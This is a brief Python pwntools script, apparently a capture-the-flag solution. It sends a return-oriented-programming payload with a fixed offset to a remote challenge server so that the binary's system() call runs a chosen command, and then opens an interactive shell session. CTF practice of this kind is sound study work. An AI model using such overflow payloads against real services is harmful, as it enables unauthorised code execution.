from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 27457)
# target = process('../memory')
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')
elf = ELF('../memory')

system = elf.plt['system']
command = 0x80487e0

payload = utils.create_rop_payload(0x13, {command: []}, 'i386', system, fake_return_addrress=system)
target.sendline(payload)
target.interactive()